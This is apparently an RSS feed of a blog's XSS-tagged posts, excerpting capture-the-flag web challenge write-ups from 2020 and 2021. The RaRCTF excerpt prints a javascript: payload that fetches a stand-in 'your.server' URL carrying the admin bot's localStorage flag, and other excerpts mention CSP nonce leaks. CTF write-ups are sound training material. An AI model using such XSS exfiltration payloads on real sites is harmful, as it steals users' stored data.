<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>xss on Vie</title>
    <link>https://jamvie.net/tags/xss/</link>
    <description>Recent content in xss on Vie</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>CC Attribution-NonCommercial 4.0 International License</copyright>
    <lastBuildDate>Sun, 24 Oct 2021 13:49:21 -0700</lastBuildDate><atom:link href="https://jamvie.net/tags/xss/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>ASIS Quals 2021: Lovely Nonce</title>
      <link>https://jamvie.net/posts/2021/10/asis-quals-2021-lovely-nonce/</link>
      <pubDate>Sun, 24 Oct 2021 13:49:21 -0700</pubDate>
      
      <guid>https://jamvie.net/posts/2021/10/asis-quals-2021-lovely-nonce/</guid>
      <description>Lovely Nonces is a challenge from ASIS Quals 2021, involving interesting CSP bypasses and stylesheet leaks. My teammate Ming and I solved this challenge together, and a copy of the writeup (with the index.html file used in the exploit) can be found in the UBC CTF blog.
TL;DR CSS attribute selectors for a stylesheet leak of the CSP nonce combined with XSS.
Recon The CSP is implemented via a meta-tag in the DOM, and not through response header as is usually the common practise.</description>
    </item>
    
    <item>
      <title>RaRCTF2021: Some simpler web probz</title>
      <link>https://jamvie.net/posts/2021/08/rarctf2021-some-simpler-web-probz/</link>
      <pubDate>Mon, 09 Aug 2021 13:49:21 -0700</pubDate>
      
      <guid>https://jamvie.net/posts/2021/08/rarctf2021-some-simpler-web-probz/</guid>
      <description>Fancy Button Generator // FBG A simple xss challenge with the slightest of twists: instead of stealing admin cookies, you&amp;rsquo;re stealing admin&amp;rsquo;s localstorage values. This was possible because the admin, which was a puppetteer chrome browser, was operating in no-sandbox mode.
Insert as your payload:
title: eh link: javascript:fetch(&amp;#39;your.server?fleg=&amp;#39;%2B(window.localStorage.getItem(&amp;#34;flag&amp;#34;))); And report to admin. Careful with the wait times&amp;hellip;
NOTE: I first-blooded this challenge before certain measures were implemented. There were some issues with FBG throughout the competition that involved the organizers making amendments and introducing a pow to help with the stability of the infrastructure.</description>
    </item>
    
    <item>
      <title>DiceCTF 2021</title>
      <link>https://jamvie.net/posts/2021/02/dicectf-2021/</link>
      <pubDate>Sun, 07 Feb 2021 19:06:12 -0700</pubDate>
      
      <guid>https://jamvie.net/posts/2021/02/dicectf-2021/</guid>
      <description>Babier CSP The challenge takes after justCTF&amp;rsquo;s similarly named challenge. We&amp;rsquo;re given an index.js file:
const express = require(&amp;#39;express&amp;#39;); const crypto = require(&amp;#34;crypto&amp;#34;); const config = require(&amp;#34;./config.js&amp;#34;); const app = express() const port = process.env.port || 3000; const SECRET = config.secret; const NONCE = crypto.randomBytes(16).toString(&amp;#39;base64&amp;#39;); const template = name =&amp;gt; ` &amp;lt;html&amp;gt; ${name === &amp;#39;&amp;#39; ? &amp;#39;&amp;#39;: `&amp;lt;h1&amp;gt;${name}&amp;lt;/h1&amp;gt;`} &amp;lt;a href=&amp;#39;#&amp;#39; id=elem&amp;gt;View Fruit&amp;lt;/a&amp;gt; &amp;lt;script nonce=${NONCE}&amp;gt; elem.onclick = () =&amp;gt; { location = &amp;#34;/?</description>
    </item>
    
    <item>
      <title>justCTF[*] 2020 - A Collection of Web Problems</title>
      <link>https://jamvie.net/posts/2021/01/justctf-2020-a-collection-of-web-problems/</link>
      <pubDate>Sun, 31 Jan 2021 23:05:20 -0700</pubDate>
      
      <guid>https://jamvie.net/posts/2021/01/justctf-2020-a-collection-of-web-problems/</guid>
      <description>This last weekend was justCTF 2020 (delayed last year so it was held this year :P), held by justCatTheFish. Although I was focused between this and some other work, I was able to look through a few of the web challenges and will document them here.
Forgotten Name I found this on a total fluke. I wasn&amp;rsquo;t paying attention to the challenge much but the description was compelling:
I&amp;rsquo;m hesitant to attempt to nmap all known domains of justCatTheFish&amp;rsquo;s network, and so instead thought about the nature of their subdomains.</description>
    </item>
    
    <item>
      <title>Common Web Exploits: A Guide for Recon</title>
      <link>https://jamvie.net/posts/2021/01/common-web-exploits-a-guide-for-recon/</link>
      <pubDate>Tue, 26 Jan 2021 12:04:52 -0700</pubDate>
      
      <guid>https://jamvie.net/posts/2021/01/common-web-exploits-a-guide-for-recon/</guid>
      <description>This is mainly used as a helpful recon guide to determine what vulnerabilities are available to you as an ethical hacker or CTFer. I&amp;rsquo;ve spent quite a bit of time researching these vulnerabilities and spotting their telltale signs, and I hope to share them here. These are common or more unique vulnerabilities that I have seen, executed, and researched while doing CTFs.
Disclaimer: This article is not exhaustive, and is not intended to replace any research you would perform on your own.</description>
    </item>
    
    <item>
      <title>GoogleCTF 2020: Pasteurize</title>
      <link>https://jamvie.net/posts/2020/08/googlectf-2020-pasteurize/</link>
      <pubDate>Sun, 23 Aug 2020 17:35:14 -0600</pubDate>
      
      <guid>https://jamvie.net/posts/2020/08/googlectf-2020-pasteurize/</guid>
      <description>This is the first challenge I worked on. I will soon upload a post on the second one. I completed this challenge with the help of my team mentor!
Let&amp;rsquo;s Begin! The challenge lets us load into the DOM whatever we want through this pastebin-esque function. When you make a note, you have an option to share it with a &amp;ldquo;TjMike&amp;rdquo; Entity. Sign of XSS/CSRF attacks?
My input, &amp;ldquo;uwu&amp;rdquo;, is shoved into a javascript string variable called &amp;rsquo;note&amp;rsquo;.</description>
    </item>
    
    <item>
      <title>RedPwnCTF 2020</title>
      <link>https://jamvie.net/posts/2020/06/redpwnctf-2020/</link>
      <pubDate>Thu, 25 Jun 2020 16:26:44 -0600</pubDate>
      
      <guid>https://jamvie.net/posts/2020/06/redpwnctf-2020/</guid>
      <description>RedPwnCTF 2020 is a beginner to intermediate CTF that&amp;rsquo;s accessible to high school and college students. The CTF featured a range of easy to harder problems, which provided both a good introduction into CTFs and an opportunity to stretch your pre-established skills. I solved through a good portion of the web problems, and will document a few of the ones here.
Let&amp;rsquo;s Begin! The problems are in no way ordered in terms of difficulty.</description>
    </item>
    
    <item>
      <title>DE1ctf 2020: Hard_Pentest_1 and Animal Crossing</title>
      <link>https://jamvie.net/posts/2020/05/de1ctf-2020-hard_pentest_1-and-animal-crossing/</link>
      <pubDate>Thu, 07 May 2020 15:20:38 -0600</pubDate>
      
      <guid>https://jamvie.net/posts/2020/05/de1ctf-2020-hard_pentest_1-and-animal-crossing/</guid>
      <description>&lt;p&gt;The intersection of web-based challenges and other challenges should be expected to be seen in CTFs, but yet still I&amp;rsquo;m always surprised when I see it in action.&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>CONfidence 2020: CatWeb</title>
      <link>https://jamvie.net/posts/2020/04/confidence-2020-catweb/</link>
      <pubDate>Thu, 23 Apr 2020 00:46:19 -0600</pubDate>
      
      <guid>https://jamvie.net/posts/2020/04/confidence-2020-catweb/</guid>
      <description>&lt;p&gt;I participated in CONfidence CTF 2020 teasers in March of this year. I was focusing mainly on this problem, and it really helped me broaden my skills in JSON-related attacks! I have never seen many JSON injections before this, so this was welcome practise.&lt;/p&gt;</description>
    </item>
    
  </channel>
</rss>
